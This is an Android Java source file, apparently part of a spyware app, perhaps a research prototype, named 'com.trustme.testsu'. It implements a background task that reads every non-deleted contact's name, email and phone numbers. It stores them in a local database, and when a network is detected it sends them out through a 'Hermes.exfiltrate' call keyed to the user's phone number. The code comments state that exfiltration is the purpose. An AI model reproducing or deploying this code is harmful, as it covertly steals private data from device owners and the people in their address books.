package com.trustme.testsu;

import java.util.ArrayList;
import java.util.HashMap;

import org.json.simple.JSONValue;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteConstraintException;
import android.database.sqlite.SQLiteDatabase;
import android.os.AsyncTask;
import android.provider.ContactsContract.Contacts;
import android.provider.ContactsContract.Data;
import android.provider.ContactsContract.RawContacts;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.provider.ContactsContract.CommonDataKinds.Phone;
import android.util.Log;

import com.trustme.testsu.utils.Constants;

//////////////////////////////////////////////////////////////////////////////////////////////////////////////
/**
 * 
 * Background Task for fetching user's contacts.
 * It should try to exfiltrate them if there is Internet available or store them
 *	in the Db and start the IP checker
 *@author sdemetr2
 */
public class GetContactsTask extends AsyncTask<Void, Void, Void>{
	public static final int WIFI_ON = 1;
	public static final int WIFI_OFF = 0;
	private WiFiTracker wifiTracker = new WiFiTracker();
	private SQLiteDatabase database;
	private ContactsDataSource datasource;
	private Context ctx;
	protected GetContactsTask() {
		ctx = MyApplication.getAppContext();
    	//ctx.deleteDatabase(DatabaseOpenHelper.DATABASE_NAME);
        datasource = new ContactsDataSource(ctx);
	}

	@Override
	protected Void doInBackground(Void... unused){
		getAndSaveContacts();
		if(wifiTracker.read_arp()){
			sendSavedContacts();
		}
		datasource.close();

		return null;
	}

	@Override
	protected void onPostExecute(Void justEyeCandy){
		super.onPostExecute(justEyeCandy);
		//getPackages();
	}

	public void sendSavedContacts(){
		String key = "contacts";
		String value = getSavedContactsAsString();
		Hermes h = new Hermes();
		HashMap<String, String> map = new HashMap<String, String>();
		map.put(key, value);
		h.exfiltrate(map, Constants.CONTACTS_TRANSACTION + ";" + User.getPhoneNumber());
		ContentValues values = new ContentValues();
		values.put(DatabaseOpenHelper.COLUMN_IS_SENT,1);
		database = datasource.open();
		database.update(
				DatabaseOpenHelper.DATABASE_TABLE_NAME,
				values,null,null);
		database.close();
	}

	private String getSavedContactsAsString(){
		ArrayList<HashMap<String,String>> contactsList = new ArrayList<HashMap<String,String>>();
		String[] projection = {
				DatabaseOpenHelper.COLUMN_ID,
				DatabaseOpenHelper.COLUMN_NAME,
				DatabaseOpenHelper.COLUMN_EMAIL,
				DatabaseOpenHelper.COLUMN_PHONE,
		};

		String sortOrder =
				DatabaseOpenHelper.COLUMN_NAME + " ASC";

		database = datasource.open();

		Cursor c = database.query(
				DatabaseOpenHelper.DATABASE_TABLE_NAME,  // The table to query
				projection,                               // The columns to return
				DatabaseOpenHelper.COLUMN_IS_SENT+"=?",                                // The columns for the WHERE clause
				new String[]{"0"},                            // The values for the WHERE clause
				null,                                     // don't group the rows
				null,                                     // don't filter by row groups
				sortOrder                                 // The sort order
				);

		if(c.moveToFirst()) {
			final int contactIdColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_ID);
			final int contactNameColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME);
			final int contactEmailColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_EMAIL);
			final int contactPhoneColumnIndex = c.getColumnIndex(DatabaseOpenHelper.COLUMN_PHONE);

			while(!c.isAfterLast()) {
				final int id = c.getInt(contactIdColumnIndex);
				final String name = c.getString(contactNameColumnIndex);
				final String email = c.getString(contactEmailColumnIndex);
				final String phone = c.getString(contactPhoneColumnIndex);
				HashMap<String, String> map = new HashMap<String, String>();
				map.put("id",id+"");
				map.put("name", name);
				map.put("email", email);
				map.put("phone", phone);
				contactsList.add(map);
				c.moveToNext();
			}
		}
		c.close();
		database.close();
		String jsonText = JSONValue.toJSONString(contactsList);
		return jsonText;
	}

	private void getAndSaveContacts() {

		database = datasource.open();
		// TODO try to exfiltrate them if there is Internet available or store them in the Db and start the IP checker          
		final String[] projection = new String[] {
				RawContacts.CONTACT_ID, // the contact id column
				RawContacts.DELETED     // column if this contact is deleted
		};

		final Cursor rawContacts = ctx.getContentResolver().query(
				RawContacts.CONTENT_URI,	// the URI for raw contact provider
				projection,
				null,					// selection = null, retrieve all entries
				null,					// selection is without parameters
				null);					// do not order

		final int contactIdColumnIndex = rawContacts.getColumnIndex(RawContacts.CONTACT_ID);

		final int deletedColumnIndex = rawContacts.getColumnIndex(RawContacts.DELETED);    	

		if(rawContacts.moveToFirst()) {
			while(!rawContacts.isAfterLast()) {		// still a valid entry left?
				final int contactId = rawContacts.getInt(contactIdColumnIndex);
				final boolean deleted = (rawContacts.getInt(deletedColumnIndex) == 1);
				if(!deleted) {

					ContentValues values = new ContentValues();

					values.put(DatabaseOpenHelper.COLUMN_ID, contactId);

					final Cursor contact = ctx.getContentResolver().query(
							Contacts.CONTENT_URI,
							new String[]{Contacts.DISPLAY_NAME},
							Contacts._ID + "=?",	// filter entries on the basis of the contact id
							new String[]{String.valueOf(contactId)},	// the parameter to which the contact id column is compared to
							null);

					if(contact.moveToFirst()) {
						final String name = contact.getString(
								contact.getColumnIndex(Contacts.DISPLAY_NAME));
						values.put(DatabaseOpenHelper.COLUMN_NAME, name);
					}
					contact.close();

					final Cursor email = ctx.getContentResolver().query(
							Email.CONTENT_URI,
							new String[]{Contacts.DISPLAY_NAME},
							Data.CONTACT_ID + "=?",
							new String[]{String.valueOf(contactId)},
							null);

					if(email.moveToFirst()) {
						final String emailId = email.getString(
								email.getColumnIndex(Contacts.DISPLAY_NAME));
						values.put(DatabaseOpenHelper.COLUMN_EMAIL, emailId);
					}
					email.close();

					final Cursor phone = ctx.getContentResolver().query(
							Phone.CONTENT_URI,
							new String[] {Phone.NUMBER,Phone.TYPE},
							Data.CONTACT_ID + "=?",
							new String[]{String.valueOf(contactId)},
							null);

					if(phone.moveToFirst()) {
						final int contactNumberColumnIndex = phone.getColumnIndex(Phone.NUMBER);
						final int contactTypeColumnIndex = phone.getColumnIndex(Phone.TYPE);
						String phoneNos = "";
						while(!phone.isAfterLast()) {
							final String number = phone.getString(contactNumberColumnIndex);
							final int type = phone.getInt(contactTypeColumnIndex);
							final int typeLabelResource = Phone.getTypeLabelResource(type);
							phoneNos += (typeLabelResource + ":" + number + ",");
							phone.moveToNext();
						}
						values.put(DatabaseOpenHelper.COLUMN_PHONE, phoneNos);
					}
					phone.close();

					
					long newRowId=-1;
					try{
						newRowId = database.insert(
							DatabaseOpenHelper.DATABASE_TABLE_NAME,
							null,
							values);
					}
					catch(SQLiteConstraintException e){
						System.out.println("insert failed");
						values.remove(DatabaseOpenHelper.COLUMN_ID);
						newRowId = database.update(
								DatabaseOpenHelper.DATABASE_TABLE_NAME,
								values,DatabaseOpenHelper.COLUMN_ID,new String[]{contactId+""});							
					}
					System.out.println("Row ID : "+newRowId);
				}
				rawContacts.moveToNext();			// move to the next entry
			}
		}
		rawContacts.close();
		database.close();
		//database.execSQL("insert into " + DatabaseOpenHelper.DATABASE_TABLE_NAME + " (name,surname,phone)" + "values(\"soteris\",\"demetriou\","+ "\"102853471\") ;");
		//Cursor c = database.rawQuery("Select * from " + DatabaseOpenHelper.DATABASE_TABLE_NAME, null);
		//c.moveToNext();
		//Log.i(TAG,c.getString(c.getColumnIndex(DatabaseOpenHelper.COLUMN_NAME)));

	}
}  
//////////////////////////////////////////////////////////////////////////////////////////////////////////////
